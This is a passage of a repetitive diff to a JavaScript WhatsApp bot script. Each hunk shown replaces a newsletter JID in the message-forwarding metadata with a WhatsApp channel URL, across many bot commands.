                   serverMessageId: 143
                 }
@@ -9518,7 +9518,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9564,7 +9564,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9610,7 +9610,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9656,7 +9656,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9702,7 +9702,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9748,7 +9748,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9797,7 +9797,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9851,7 +9851,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9900,7 +9900,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9946,7 +9946,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9992,7 +9992,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10038,7 +10038,7 @@ case 'what': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10084,7 +10084,7 @@ if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is 
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10130,7 +10130,7 @@ case 'how': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10176,7 +10176,7 @@ case 'rate': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10231,7 +10231,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10278,7 +10278,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10324,7 +10324,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10366,7 +10366,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10413,7 +10413,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10461,7 +10461,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10507,7 +10507,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10553,7 +10553,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10598,7 +10598,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10741,7 +10741,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10795,7 +10795,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10845,7 +10845,7 @@ case 'pick': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10909,7 +10909,7 @@ if (!text) return replygcxeon('Where is the text?')
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -10953,7 +10953,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11000,7 +11000,7 @@ case 'truth': case 'dare': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11127,7 +11127,7 @@ case 'dere':{
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -11262,7 +11262,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13039,7 +13039,7 @@ await XeonStickWait()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13084,7 +13084,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13129,7 +13129,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13174,7 +13174,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13219,7 +13219,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13264,7 +13264,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13309,7 +13309,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13354,7 +13354,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13399,7 +13399,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13444,7 +13444,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13489,7 +13489,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13534,7 +13534,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13579,7 +13579,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13624,7 +13624,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13669,7 +13669,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13714,7 +13714,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13759,7 +13759,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13804,7 +13804,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13849,7 +13849,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13894,7 +13894,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13939,7 +13939,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -13984,7 +13984,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14029,7 +14029,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14074,7 +14074,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14119,7 +14119,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14164,7 +14164,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14209,7 +14209,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14254,7 +14254,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14299,7 +14299,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14344,7 +14344,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14389,7 +14389,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14434,7 +14434,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14479,7 +14479,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14524,7 +14524,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14569,7 +14569,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14614,7 +14614,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14659,7 +14659,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14704,7 +14704,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14749,7 +14749,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14794,7 +14794,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14839,7 +14839,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14902,7 +14902,7 @@ _*Here is the result of ${text}*_\n\n${animetxt}`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14951,7 +14951,7 @@ if (!AntiNsfw) return replygcxeon(mess.nsfw)
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -14999,7 +14999,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15046,7 +15046,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15094,7 +15094,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15141,7 +15141,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15188,7 +15188,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15235,7 +15235,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15283,7 +15283,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
